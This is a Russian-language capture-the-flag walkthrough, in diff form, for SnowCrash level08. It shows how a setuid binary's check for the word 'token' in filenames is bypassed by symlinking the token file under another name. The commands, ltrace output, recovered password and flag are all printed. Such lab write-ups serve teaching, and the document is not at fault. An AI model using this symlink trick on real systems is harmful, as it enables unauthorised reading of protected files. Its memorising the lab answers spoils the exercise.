@@ -1,0 +1,52 @@
+В домашнем каталоге  исполняемый файл, и файл токена, к которому нет доступа:
+
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
+
+Если попробовать передать свой файл - отобразится его содержимое:
+
+level08@SnowCrash:~$ echo 'HELLO' > /tmp/hello && ./level08 /tmp/hello
+HELLO
+Но не работает с файлом токена:
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+Попытаемся создать символическую ссылку на токен?
+
+level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/token
+level08@SnowCrash:~$ ls -l /tmp/token
+lrwxrwxrwx 1 level08 level08 24 Oct 23 02:18 /tmp/token -> /home/user/level08/token
+
+Теперь если запустить программу:
+
+level08@SnowCrash:~$ ./level08 /tmp/mytoken
+You may not access '/tmp/mytoken'
+
+Не работает... 
+Отладим в ltrace:
+
+level08@SnowCrash:~$ ltrace ./level08 /tmp/mytoken
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/mytoken", "token")                                 = "token"
+printf("You may not access '%s'\n", "/tmp/mytoken"You may not access '/tmp/mytoken'
+)             = 34
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+Имя файла проверяется на наличие слова "token", поэтому мы должны убедиться, что наш файл называется по-другому:
+
+level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/password
+
+level08@SnowCrash:~$ ./level08 /tmp/password
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
